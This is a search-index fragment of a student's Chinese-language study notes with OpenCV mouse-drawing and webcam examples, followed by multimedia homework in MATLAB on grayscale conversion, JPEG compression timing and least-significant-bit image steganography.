\u5c06cv2\u4e2d\u6240\u6709\u7684\u5305\u542bEVENT\u7684\u6253\u5370\u51fa\u6765 events = [ i for i in dir ( cv2 ) if 'EVENT' in i ] # print(events) import numpy as np def draw_circle ( event , x , y , flags , param ): if event == cv2 . EVENT_LBUTTONDBLCLK : # \u76d1\u542c\u9f20\u6807\u53cc\u51fb\u4e8b\u4ef6 cv2 . circle ( img , ( x , y ), 100 , ( 255 , 0 , 0 ), - 1 ) img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( 'image' ) cv2 . setMouseCallback ( 'image' , draw_circle ) # \u56de\u8c03\u51fd\u6570 while ( 1 ): cv2 . imshow ( 'image' , img ) if cv2 . waitKey ( 20 ) & 0xff == 27 : break cv2 . destroyAllWindows () \u9700\u8981\u81ea\u5df1\u521b\u5efa\u56de\u8c03\u51fd\u6570\uff0c\u540c\u65f6\u76d1\u542c\u4e8b\u4ef6 \u5982\u56fe\u6211\u53cc\u51fb\u7684\u65f6\u5019\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u5706","title":"\u7528\u9f20\u6807\u7ed8\u56fe"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import cv2 import numpy as np drawing = False mode = True ix , iy = - 1 , - 1 def draw_circle ( event , x , y , flags , param ): global ix , iy , drawing , mode if event == cv2 . EVENT_LBUTTONDOWN : drawing = True ix , iy = x , y elif event == cv2 . EVENT_MOUSEMOVE and flags == cv2 . EVENT_FLAG_LBUTTON : if drawing == True : if mode == True : cv2 . rectangle ( img , ( ix , iy ),( x , y ),( 0 , 255 , 0 ), - 1 ) else : cv2 . circle ( img , ( x , y ), 3 , ( 0 , 0 , 255 ), - 1 ) elif event == cv2 . EVENT_LBUTTONUP : drawing = False img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( 'image' ) cv2 . setMouseCallback ( 'image' , draw_circle ) while True : cv2 . imshow ( 'image' , img ) k = cv2 . waitKey ( 1 ) & 0xff if k == ord ( 'm' ): mode = not mode elif k == 27 : break \u901a\u8fc7\u9f20\u6807\u7684\u62d6\u52a8\u53ef\u4ee5\u7ed8\u5236\u4e00\u4e2a\u65b9\u5f62","title":"\u66f4\u9ad8\u7ea7\u4e00\u70b9\u7684\u64cd\u4f5c"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_6","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 import cv2 cap = cv2 . VideoCapture ( 0 ) while True : ret , frame = cap . read () # read\u51fd\u6570\u8fd4\u56de\u4e24\u4e2a\u503c\uff1f ret\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8c03\u7528\u6210\u529f\u8fd4\u56deTrue print ( ret ) # gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) # \u8f6c\u7070\u5ea6\u56fe\u50cf cv2 . imshow ( 'frame' , frame ) if cv2 . waitKey ( 1 ) & 0xff == ord ( 'q' ): break cap . release () # \u91ca\u653e cv2 . destroyAllWindows () # \u9500\u6bc1\u6240\u6709\u7684\u7a97\u53e3","title":"\u6253\u5f00\u6444\u50cf\u5934\u5f55\u5236\u89c6\u9891"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/sift\u7b97\u5b50/","text":"","title":"Sift\u7b97\u5b50"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e00\u6b21\u4f5c\u4e1a/","text":"\u300a\u591a\u5a92\u4f53\u6280\u672f\u300b\u7b2c1\u6b21\u4f5c\u4e1a \u59d3\u540d\uff1a\u5f6d\u99a8\u52c7 \u5b66\u53f7\uff1a2017301510012 \u5b8c\u6210\u65e5\u671f 2019\u5e7410\u67084\u65e5 1. \u5c06\u4e00\u526f\u5f69\u8272\u56fe\u7247\uff0c\u53d8\u6210\u7070\u5ea6\u56fe\uff0c\u6bd4\u8f83\u53d8\u6362\u524d\u540eBitmap\u683c\u5f0f\u548cJPG\u683c\u5f0f\u56fe\u50cf\u5927\u5c0f \u00b6 \u89e3\uff1a (1)\u6280\u672f\u601d\u8def\u3001\u4e3b\u8981\u8ba1\u7b97\u516c\u5f0f \u5c06\u8001\u5e08\u7ed9\u7684jpg\u56fe\u7247\u8f93\u5165matlab\uff0c\u8f6c\u4e3abmp\u56fe\u7247 \u8c03\u7528rgb2gray\u51fd\u6570\u5c06\u5f69\u8272\u56fe\u50cf\u8f6c\u4e3a\u7070\u5ea6\u56fe (2)\u6838\u5fc3\u4ee3\u7801 1 2 3 4 5 6 7 8 % \u53d8\u6210\u7070\u5ea6\u56fe\u50cf imgjpg = imread ( 'zuoye.jpg' ); imwrite ( imgjpg , 'clone.bmp' ); imgbmp = imread ( 'clone.bmp' ); imgGraybmp = rgb2gray ( imgbmp ); imgGrayjpg = rgb2gray ( imgjpg ); imwrite ( imgGrayjpg , 'cloneGray.jpg' ); imwrite ( imgGraybmp , 'cloneGray.bmp' ); (3)\u8fd0\u884c\u7ed3\u679c(\u5305\u542b\u4e3b\u673a\u914d\u7f6e\uff0c\u8fd0\u884c\u73af\u5883\uff0c\u5f00\u53d1\u73af\u5883\uff0c\u6267\u884c\u65f6\u95f4\uff0c\u8f93\u5165\u6587\u4ef6\u540d\uff0c\u8f93\u51fa\u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u7ed9\u51fa\u7b80\u5355\u7684\u5206\u6790) \u4e3b\u673a\u914d\u7f6e\uff1a\u60e0\u666e\u6697\u5f71\u7cbe\u7075\u7b2c\u4e8c\u4ee3,CPU:i7-7700HQ,RAM:16GB \u8fd0\u884c\u73af\u5883:WIN10 \u5f00\u53d1\u73af\u5883:Matlab2016a \u6267\u884c\u65f6\u95f4:2019.10.4 \u8f93\u5165\u6587\u4ef6:zuoye.jpg \u8f93\u51fa\u6587\u4ef6:cloneGray.jpg,cloneGray.bmp \u53d8\u6362\u524djpg\u5927\u5c0f:5.78M \u53d8\u6362\u540ejpg\u5927\u5c0f:3.16M \u53d8\u6362\u524dbmp\u5927\u5c0f:68.6M \u53d8\u6362\u540ebmp\u5927\u5c0f:22.8M \u56fe\u7247\u5c55\u793a\uff1a \u56fe1 zuoye.jpg \u56fe2 cloneGray.jpg \u56fe3 clone.bmp \u56fe4 cloneGray.bmp 2 \u7528jpg\u538b\u7f29\u4e00\u526f\u56fe\u7247\uff0c\u4ecebitmap\u5230jpg\uff0c\u6bd4\u8f83\u4e0d\u540c\u538b\u7f29\u7387\u4e0b\u7684\u8ba1\u7b97\u65f6\u95f4\uff0c\u4e3b\u89c2\u8bc4\u4ef7\u5bb9\u5fcd\u5ea6 \u00b6 \u89e3: (1)\u6280\u672f\u601d\u8def\u3001\u4e3b\u8981\u8ba1\u7b97\u516c\u5f0f \u7528 imwrite \u8bed\u53e5\u5bf9\u7b2c\u4e00\u9898\u4e2d\u4ea7\u751f\u7684bmp\u56fe\u7247\u8fdb\u884c\u538b\u7f29\uff0c\u7528matlab\u68c0\u6d4b\u8fd0\u884c\u65f6\u95f4 (2)\u6838\u5fc3\u4ee3\u7801 1 2 3 4 5 6 imwrite ( imgbmp , 'compression90.jpg' , 'quality' , 90 ); imwrite ( imgbmp , 'compression80.jpg' , 'quality' , 80 ); imwrite ( imgbmp , 'compression70.jpg' , 'quality' , 70 ); imwrite ( imgbmp , 'compression50.jpg' , 'quality' , 50 ); imwrite ( imgbmp , 'compression30.jpg' , 'quality' , 30 ); imwrite ( imgbmp , 'compression10.jpg' , 'quality' , 10 ); (3)\u8fd0\u884c\u7ed3\u679c \u4e3b\u673a\u914d\u7f6e\uff1ai7-7700HQ,RAM:4GB \u8fd0\u884c\u73af\u5883\uff1awin10 \u5f00\u53d1\u73af\u5883\uff1amatlab2016a \u8f93\u51fa\u6587\u4ef6\u540d\uff1acompression90.jpg\uff0ccompression80.jpg\uff0ccompression70.jpg\uff0ccompression50.jpg\uff0ccompression30.jpg\uff0ccompression10.jpg \u56fe5 compression90.jpg \u56fe6 compression80.jpg \u56fe7 compression70.jpg \u56fe8 compression50.jpg \u56fe9 compression30.jpg \u56fe10 compression10.jpg \u89c6\u89c9\u5bb9\u5fcd\u5ea6\uff1a \u538b\u7f29\u8d28\u91cf\u56e0\u5b50\u4e3a90\uff0c80\uff0c70\uff0c50\u65f6\u5e76\u4e0d\u80fd\u770b\u51fa\u4e0e\u539f\u56fe\u6709\u4efb\u4f55\u5dee\u522b\uff0c\u5bb9\u5fcd\u5ea6\u4e3a5\u7ea7 \u538b\u7f29\u8d28\u91cf\u5f15\u5b50\u4e3a30\u65f6\uff0c\u5929\u7a7a\u51fa\u73b0\u4e0d\u6613\u5bdf\u89c9\u7684\u767d\u8272\u7f1d\u9699\uff0c\u5bb9\u5fcd\u5ea6\u4e3a4\u7ea7 \u538b\u7f29\u8d28\u91cf\u56e0\u5b50\u4e3a10\u65f6\uff0c\u5929\u7a7a\u4e2d\u51fa\u73b0\u660e\u663e\u5f69\u8272\u6761\u7eb9\uff0c\u5176\u4f59\u90e8\u5206\u8868\u73b0\u826f\u597d\uff0c\u5bb9\u5fcd\u5ea6\u4e3a3\u7ea7 \u538b\u7f29\u65f6\u95f4\uff0c\u8c03\u7528matlab clock \u51fd\u6570\u8ba1\u7b97\u7684\u65f6\u95f4\u5982\u4e0b\uff1a \u8d28\u91cf \u538b\u7f29\u65f6\u95f4 compression90.jpg 0.9690 compression80.jpg 0.9180 compression70.jpg 0.8960 compression50.jpg 0.8090 compression30.jpg 0.7890 compression10.jpg 0.7370 3 \u5728\u5f69\u8272Bitmap\u4f4d\u56fe\u5185\uff0c\u5d4c\u5165\u4e00\u6bb5\u5b57\u7b26\u4e32\uff0c\u5e76\u6b63\u786e\u63d0\u53d6 \u00b6 (1)\u6280\u672f\u601d\u8def \u53ef\u4ee5\u628a\u6587\u5b57\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4f4d\uff0c\u66ff\u6362\u6389bmp\u56fe\u7247\u7684\u6bcf\u4e00\u4e2a\u50cf\u7d20\u7684\u7ea2\u8272\u7684\u6700\u540e\u4e00\u4f4d \u5d4c\u5165\u51fd\u6570 Embed \u8bfb\u5165\u4e00\u526f\u56fe\u7247(\u6ce8\u610f\u4e0d\u80fd\u662fjpg\u683c\u5f0f\u7684),\u8bfb\u5165\u9700\u8981\u9690\u5199\u7684\u4fe1\u606f\u6587\u4ef6\uff0c\u5224\u65ad\u662f\u5426\u80fd\u591f\u9690\u5199\uff0c\u4e4b\u540e\u8c03\u7528 randinterval \u51fd\u6570\u968f\u673a\u9009\u53d6R\u56fe\u5c42\u4e0a\u7684\u70b9\uff0c\u5d4c\u5165\u6d88\u606f \u968f\u673a\u51fd\u6570 randinterval \u901a\u8fc7\u7ed9\u5b9a\u7684key\u751f\u6210\u968f\u673a\u7684\u6837\u672c\u70b9 \u63d0\u53d6\u51fd\u6570 Extract \u6307\u5b9a\u56fe\u7247\uff0c\u548c\u968f\u673a\u79cd\u5b50\u63d0\u53d6\u51fa\u4fe1\u606f (2)\u6838\u5fc3\u4ee3\u7801 Embed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 %input: \u6587\u4ef6\uff0cfile\u8981\u9690\u5199\u7684\u4fe1\u606f key\u5bc6\u94a5 % functionname: function description function [ste_cover, len_total] = Embed ( input, file, output, key ) cover = imread ( input ); ste_cover = cover ; ste_cover = double ( ste_cover ); % f_id = fopen ( file , 'r' ); [ msg , len_total ] = fread ( f_id , 'ubit1' ); % [ m , n ] = size ( ste_cover ); if len_total > m * n error ( '\u5d4c\u5165\u6d88\u606f\u8fc7\u5927\uff0c\u8bf7\u66f4\u6362\u56fe\u50cf' ); end % p = 1 ; [ row , col ] = randinterval ( ste_cover , len_total , key ); for i = 1 : len_total ste_cover ( row ( i ), col ( i )) = ste_cover ( row ( i ), col ( i )) - mod ( ste_cover ( row ( i ), col ( i )), 2 ) + msg ( p , 1 ); %\u901a\u8fc7\u6a212\u6765\u53d6\u51fa\u6700\u540e\u4e00\u4f4d if p == len_total break ; end p = p + 1 ; end ste_cover = uint8 ( ste_cover ); imwrite ( ste_cover , output ); subplot ( 121 ); imshow ( cover ); title ( '\u539f\u6765\u7684\u56fe\u7247' ); subplot ( 122 ); imshow ( output ); title ( '\u9690\u5199\u540e\u7684\u56fe\u7247' ); \u968f\u673a\u51fd\u6570 randinterval 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 function [row, col] = randinterval ( matrix, count, key ) %\u8ba1\u7b97\u95f4\u9694\u7684\u4f4d\u6570 [ m , n ] = size ( matrix ); interval1 = floor ( m * n / count ) + 1 ; interval2 = interval1 - 2 ; if interval2 == 0 errot ( '\u8f7d\u4f53\u592a\u5c0f\u4e0d\u80fd\u5c06\u4fe1\u606f\u9690\u85cf\u8fdb\u53bb' ); end %\u751f\u6210\u968f\u673a\u5e8f\u5217 rand ( 'seed' , key ); a = rand ( 1 , count ); %\u521d\u59cb\u5316 row = zeros ([ 1 count ]); col = zeros ([ 1 count ]); %\u8ba1\u7b97row\u548ccol r = 1 ; c = 1 ; row ( 1 , 1 ) = r ; col ( 1 , 1 ) = c ; for i = 2 : count if a ( i ) > = 0.5 c = c + interval1 ; else c = c + interval2 ; end if c > n r = r + 1 ; if r > m error ( '\u8f7d\u4f53\u592a\u5c0f\u4e0d\u80fd\u5c06\u5bc6\u7801\u4fe1\u606f\u9690\u85cf\u8fdb\u53bb' ); end c = mod ( c , n ); if c == 0 c = 1 ; end end row ( 1 , i ) = r ; col ( 1 , i ) = c ; end \u63d0\u53d6\u51fd\u6570 Extract 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 % Extract.m: function description % output\u5373\u9690\u5199\u7684\u56fe\u7247\uff0clen_total\u662f\u9690\u5199\u7684\u6d88\u606f\u957f\u5ea6\uff0cgoalfile\u662f\u8f93\u51fa\u7684\u76ee\u6807\u6587\u4ef6\uff0ckey\u662f\u5bc6\u94a5 function result = Extract ( output, len_total, goalfile, key ) ste_cover = imread ( output ); ste_cover = double ( ste_cover ); [ m , n ] = size ( ste_cover ); frr = fopen ( goalfile , 'a+' ); p = 1 ; [ row , col ] = randinterval ( ste_cover , len_total , key ); for i = 1 : len_total if bitand ( ste_cover ( row ( i ), col ( i )), 1 ) == 1 fwrite ( frr , 1 , 'ubit1' ); result ( p , 1 ) = 1 ; else fwrite ( frr , 0 , 'ubit1' ); result ( p , 1 ) = 0 ; end if p == len_total break ; p = p + 1 ; end end fclose ( frr ); f = fopen ( goalfile , 'r' ); text = textscan ( f , '%c' ); text { 1 } (3)\u8fd0\u884c\u7ed3\u679c \u4e3b\u673a\u914d\u7f6e\uff1a\u60e0\u666e\u6697\u5f71\u7cbe\u7075\u7b2c\u4e8c\u4ee3,CPU:i7-7700HQ,RAM:16GB \u8fd0\u884c\u73af\u5883:WIN10 \u5f00\u53d1\u73af\u5883:Matlab2016a \u6267\u884c\u65f6\u95f4:2019.10.4 \u8f93\u5165\u6587\u4ef6: 1031.png,message.txt \u56fe11 1031.png \u56fe12 message.txt \u8f93\u51fa\u6587\u4ef6: 1031hide.png,secret.txt \u56fe13 1031hide.png \u56fe14 secret.txt","title":"\u591a\u5a92\u4f53\u7b2c\u4e00\u6b21\u4f5c\u4e1a"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e00\u6b21\u4f5c\u4e1a/#1-bitmapjpg","text":"\u89e3\uff1a (1)\u6280\u672f\u601d\u8def\u3001\u4e3b\u8981\u8ba1\u7b97\u516c\u5f0f \u5c06\u8001\u5e08\u7ed9\u7684jpg\u56fe\u7247\u8f93\u5165matlab\uff0c\u8f6c\u4e3abmp\u56fe\u7247 \u8c03\u7528rgb2gray\u51fd\u6570\u5c06\u5f69\u8272\u56fe\u50cf\u8f6c\u4e3a\u7070\u5ea6\u56fe (2)\u6838\u5fc3\u4ee3\u7801 1 2 3 4 5 6 7 8 % \u53d8\u6210\u7070\u5ea6\u56fe\u50cf imgjpg = imread ( 'zuoye.jpg' ); imwrite ( imgjpg , 'clone.bmp' ); imgbmp = imread ( 'clone.bmp' ); imgGraybmp = rgb2gray ( imgbmp ); imgGrayjpg = rgb2gray ( imgjpg ); imwrite ( imgGrayjpg , 'cloneGray.jpg' ); imwrite ( imgGraybmp , 'cloneGray.bmp' ); (3)\u8fd0\u884c\u7ed3\u679c(\u5305\u542b\u4e3b\u673a\u914d\u7f6e\uff0c\u8fd0\u884c\u73af\u5883\uff0c\u5f00\u53d1\u73af\u5883\uff0c\u6267\u884c\u65f6\u95f4\uff0c\u8f93\u5165\u6587\u4ef6\u540d\uff0c\u8f93\u51fa\u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u7ed9\u51fa\u7b80\u5355\u7684\u5206\u6790) \u4e3b\u673a\u914d\u7f6e\uff1a\u60e0\u666e\u6697\u5f71\u7cbe\u7075\u7b2c\u4e8c\u4ee3,CPU:i7-7700HQ,RAM:16GB \u8fd0\u884c\u73af\u5883:WIN10 \u5f00\u53d1\u73af\u5883:Matlab2016a \u6267\u884c\u65f6\u95f4:2019.10.4 \u8f93\u5165\u6587\u4ef6:zuoye.jpg \u8f93\u51fa\u6587\u4ef6:cloneGray.jpg,cloneGray.bmp \u53d8\u6362\u524djpg\u5927\u5c0f:5.78M \u53d8\u6362\u540ejpg\u5927\u5c0f:3.16M \u53d8\u6362\u524dbmp\u5927\u5c0f:68.6M \u53d8\u6362\u540ebmp\u5927\u5c0f:22.8M \u56fe\u7247\u5c55\u793a\uff1a \u56fe1 zuoye.jpg \u56fe2 cloneGray.jpg \u56fe3 clone.bmp \u56fe4 cloneGray.bmp","title":"1. \u5c06\u4e00\u526f\u5f69\u8272\u56fe\u7247\uff0c\u53d8\u6210\u7070\u5ea6\u56fe\uff0c\u6bd4\u8f83\u53d8\u6362\u524d\u540eBitmap\u683c\u5f0f\u548cJPG\u683c\u5f0f\u56fe\u50cf\u5927\u5c0f"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e00\u6b21\u4f5c\u4e1a/#2-jpgbitmapjpg","text":"\u89e3: (1)\u6280\u672f\u601d\u8def\u3001\u4e3b\u8981\u8ba1\u7b97\u516c\u5f0f \u7528 imwrite \u8bed\u53e5\u5bf9\u7b2c\u4e00\u9898\u4e2d\u4ea7\u751f\u7684bmp\u56fe\u7247\u8fdb\u884c\u538b\u7f29\uff0c\u7528matlab\u68c0\u6d4b\u8fd0\u884c\u65f6\u95f4 (2)\u6838\u5fc3\u4ee3\u7801 1 2 3 4 5 6 imwrite ( imgbmp , 'compression90.jpg' , 'quality' , 90 ); imwrite ( imgbmp , 'compression80.jpg' , 'quality' , 80 ); imwrite ( imgbmp , 'compression70.jpg' , 'quality' , 70 ); imwrite ( imgbmp , 'compression50.jpg' , 'quality' , 50 ); imwrite ( imgbmp , 'compression30.jpg' , 'quality' , 30 ); imwrite ( imgbmp , 'compression10.jpg' , 'quality' , 10 ); (3)\u8fd0\u884c\u7ed3\u679c \u4e3b\u673a\u914d\u7f6e\uff1ai7-7700HQ,RAM:4GB \u8fd0\u884c\u73af\u5883\uff1awin10 \u5f00\u53d1\u73af\u5883\uff1amatlab2016a \u8f93\u51fa\u6587\u4ef6\u540d\uff1acompression90.jpg\uff0ccompression80.jpg\uff0ccompression70.jpg\uff0ccompression50.jpg\uff0ccompression30.jpg\uff0ccompression10.jpg \u56fe5 compression90.jpg \u56fe6 compression80.jpg \u56fe7 compression70.jpg \u56fe8 compression50.jpg \u56fe9 compression30.jpg \u56fe10 compression10.jpg \u89c6\u89c9\u5bb9\u5fcd\u5ea6\uff1a \u538b\u7f29\u8d28\u91cf\u56e0\u5b50\u4e3a90\uff0c80\uff0c70\uff0c50\u65f6\u5e76\u4e0d\u80fd\u770b\u51fa\u4e0e\u539f\u56fe\u6709\u4efb\u4f55\u5dee\u522b\uff0c\u5bb9\u5fcd\u5ea6\u4e3a5\u7ea7 \u538b\u7f29\u8d28\u91cf\u5f15\u5b50\u4e3a30\u65f6\uff0c\u5929\u7a7a\u51fa\u73b0\u4e0d\u6613\u5bdf\u89c9\u7684\u767d\u8272\u7f1d\u9699\uff0c\u5bb9\u5fcd\u5ea6\u4e3a4\u7ea7 \u538b\u7f29\u8d28\u91cf\u56e0\u5b50\u4e3a10\u65f6\uff0c\u5929\u7a7a\u4e2d\u51fa\u73b0\u660e\u663e\u5f69\u8272\u6761\u7eb9\uff0c\u5176\u4f59\u90e8\u5206\u8868\u73b0\u826f\u597d\uff0c\u5bb9\u5fcd\u5ea6\u4e3a3\u7ea7 \u538b\u7f29\u65f6\u95f4\uff0c\u8c03\u7528matlab clock \u51fd\u6570\u8ba1\u7b97\u7684\u65f6\u95f4\u5982\u4e0b\uff1a \u8d28\u91cf \u538b\u7f29\u65f6\u95f4 compression90.jpg 0.9690 compression80.jpg 0.9180 compression70.jpg 0.8960 compression50.jpg 0.8090 compression30.jpg 0.7890 compression10.jpg 0.7370","title":"2 \u7528jpg\u538b\u7f29\u4e00\u526f\u56fe\u7247\uff0c\u4ecebitmap\u5230jpg\uff0c\u6bd4\u8f83\u4e0d\u540c\u538b\u7f29\u7387\u4e0b\u7684\u8ba1\u7b97\u65f6\u95f4\uff0c\u4e3b\u89c2\u8bc4\u4ef7\u5bb9\u5fcd\u5ea6"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e00\u6b21\u4f5c\u4e1a/#3-bitmap","text":"(1)\u6280\u672f\u601d\u8def \u53ef\u4ee5\u628a\u6587\u5b57\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4f4d\uff0c\u66ff\u6362\u6389bmp\u56fe\u7247\u7684\u6bcf\u4e00\u4e2a\u50cf\u7d20\u7684\u7ea2\u8272\u7684\u6700\u540e\u4e00\u4f4d \u5d4c\u5165\u51fd\u6570 Embed \u8bfb\u5165\u4e00\u526f\u56fe\u7247(\u6ce8\u610f\u4e0d\u80fd\u662fjpg\u683c\u5f0f\u7684),\u8bfb\u5165\u9700\u8981\u9690\u5199\u7684\u4fe1\u606f\u6587\u4ef6\uff0c\u5224\u65ad\u662f\u5426\u80fd\u591f\u9690\u5199\uff0c\u4e4b\u540e\u8c03\u7528 randinterval \u51fd\u6570\u968f\u673a\u9009\u53d6R\u56fe\u5c42\u4e0a\u7684\u70b9\uff0c\u5d4c\u5165\u6d88\u606f \u968f\u673a\u51fd\u6570 randinterval \u901a\u8fc7\u7ed9\u5b9a\u7684key\u751f\u6210\u968f\u673a\u7684\u6837\u672c\u70b9 \u63d0\u53d6\u51fd\u6570 Extract \u6307\u5b9a\u56fe\u7247\uff0c\u548c\u968f\u673a\u79cd\u5b50\u63d0\u53d6\u51fa\u4fe1\u606f (2)\u6838\u5fc3\u4ee3\u7801 Embed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 %input: \u6587\u4ef6\uff0cfile\u8981\u9690\u5199\u7684\u4fe1\u606f key\u5bc6\u94a5 % functionname: function description function [ste_cover, len_total] = Embed ( input, file, output, key ) cover = imread ( input ); ste_cover = cover ; ste_cover = double ( ste_cover ); % f_id = fopen ( file , 'r' ); [ msg , len_total ] = fread ( f_id , 'ubit1' ); % [ m , n ] = size ( ste_cover ); if len_total > m * n error ( '\u5d4c\u5165\u6d88\u606f\u8fc7\u5927\uff0c\u8bf7\u66f4\u6362\u56fe\u50cf' ); end % p = 1 ; [ row , col ] = randinterval ( ste_cover , len_total , key ); for i = 1 : len_total ste_cover ( row ( i ), col ( i )) = ste_cover ( row ( i ), col ( i )) - mod ( ste_cover ( row ( i ), col ( i )), 2 ) + msg ( p , 1 ); %\u901a\u8fc7\u6a212\u6765\u53d6\u51fa\u6700\u540e\u4e00\u4f4d if p == len_total break ; end p = p + 1 ; end ste_cover = uint8 ( ste_cover ); imwrite ( ste_cover , output ); subplot ( 121 ); imshow ( cover ); title ( '\u539f\u6765\u7684\u56fe\u7247' ); subplot ( 122 ); imshow ( output ); title ( '\u9690\u5199\u540e\u7684\u56fe\u7247' ); \u968f\u673a\u51fd\u6570 randinterval 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 function [row, col] = randinterval ( matrix, count, key ) %\u8ba1\u7b97\u95f4\u9694\u7684\u4f4d\u6570 [ m , n ] = size ( matrix ); interval1 = floor ( m * n / count ) + 1 ; interval2 = interval1 - 2 ; if interval2 == 0 errot ( '\u8f7d\u4f53\u592a\u5c0f\u4e0d\u80fd\u5c06\u4fe1\u606f\u9690\u85cf\u8fdb\u53bb' ); end %\u751f\u6210\u968f\u673a\u5e8f\u5217 rand ( 'seed' , key ); a = rand ( 1 , count ); %\u521d\u59cb\u5316 row = zeros ([ 1 count ]); col = zeros ([ 1 count ]); %\u8ba1\u7b97row\u548ccol r = 1 ; c = 1 ; row ( 1 , 1 ) = r ; col ( 1 , 1 ) = c ; for i = 2 : count if a ( i ) > = 0.5 c = c + interval1 ; else c = c + interval2 ; end if c > n r = r + 1 ; if r > m error ( '\u8f7d\u4f53\u592a\u5c0f\u4e0d\u80fd\u5c06\u5bc6\u7801\u4fe1\u606f\u9690\u85cf\u8fdb\u53bb' ); end c = mod ( c , n ); if c == 0 c = 1 ; end end row ( 1 , i ) = r ; col ( 1 , i ) = c ; end \u63d0\u53d6\u51fd\u6570 Extract 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 % Extract.m: function description % output\u5373\u9690\u5199\u7684\u56fe\u7247\uff0clen_total\u662f\u9690\u5199\u7684\u6d88\u606f\u957f\u5ea6\uff0cgoalfile\u662f\u8f93\u51fa\u7684\u76ee\u6807\u6587\u4ef6\uff0ckey\u662f\u5bc6\u94a5 function result = Extract ( output, len_total, goalfile, key ) ste_cover = imread ( output ); ste_cover = double ( ste_cover ); [ m , n ] = size ( ste_cover ); frr = fopen ( goalfile , 'a+' ); p = 1 ; [ row , col ] = randinterval ( ste_cover , len_total , key ); for i = 1 : len_total if bitand ( ste_cover ( row ( i ), col ( i )), 1 ) == 1 fwrite ( frr , 1 , 'ubit1' ); result ( p , 1 ) = 1 ; else fwrite ( frr , 0 , 'ubit1' ); result ( p , 1 ) = 0 ; end if p == len_total break ; p = p + 1 ; end end fclose ( frr ); f = fopen ( goalfile , 'r' ); text = textscan ( f , '%c' ); text { 1 } (3)\u8fd0\u884c\u7ed3\u679c \u4e3b\u673a\u914d\u7f6e\uff1a\u60e0\u666e\u6697\u5f71\u7cbe\u7075\u7b2c\u4e8c\u4ee3,CPU:i7-7700HQ,RAM:16GB \u8fd0\u884c\u73af\u5883:WIN10 \u5f00\u53d1\u73af\u5883:Matlab2016a \u6267\u884c\u65f6\u95f4:2019.10.4 \u8f93\u5165\u6587\u4ef6: 1031.png,message.txt \u56fe11 1031.png \u56fe12 message.txt \u8f93\u51fa\u6587\u4ef6: 1031hide.png,secret.txt \u56fe13 1031hide.png \u56fe14 secret.txt","title":"3 \u5728\u5f69\u8272Bitmap\u4f4d\u56fe\u5185\uff0c\u5d4c\u5165\u4e00\u6bb5\u5b57\u7b26\u4e32\uff0c\u5e76\u6b63\u786e\u63d0\u53d6"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/\u591a\u5a92\u4f53\u7b2c\u4e8c\u6b21\u4f5c\u4e1a/","text":"\u300a\u591a\u5a92\u4f53\u6280\u672f\u300b\u7b2c\u4e8c\u6b21\u4f5c\u4e1a \u59d3\u540d\uff1a\u5f6d\u99a8\u52c7 \u5b66\u53f7\uff1a2017301510012 \u5b8c\u6210\u65e5\u671f 2019\u5e7410\u670815\u65e5 \u6838\u5fc3\u7b97\u6cd5\u539f\u7406 \u00b6 SURF\u7b97\u6cd5 \u00b6 SURF\u7b97\u6cd5\u662f\u5728SIFT\u7b97\u6cd5\u6539\u8fdb\u7684\u57fa\u7840\u4e0a\u63d0\u51fa\u6765\u7684\uff0c\u662f\u4e00\u4e2a\u52a0\u901f\u7248\u7684SIFT\u7b97\u6cd5\uff0cSift\u91c7\u7528\u7684\u662fDOG\u56fe\u50cf\uff0c\u800csurf\u91c7\u7528\u7684\u662fHessian\u77e9\u9635\u884c\u5217\u5f0f\u8fd1\u4f3c\u503c\u56fe\u50cf\u3002\u5373\u6bcf\u4e00\u4e2a\u50cf\u7d20\u70b9\u90fd\u53ef\u4ee5\u6c42\u51fa\u4e00\u4e2aHessian\u77e9\u9635\u3002\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u7684\u7279\u5f81\u70b9\u9700\u8981\u5177\u5907\u5c3a\u5ea6\u65e0\u5173\u6027\uff0c\u6240\u4ee5\u5728\u8fdb\u884cHessian\u77e9\u9635\u6784\u9020\u524d\uff0c\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u9ad8\u65af\u6ee4\u6ce2\u3002 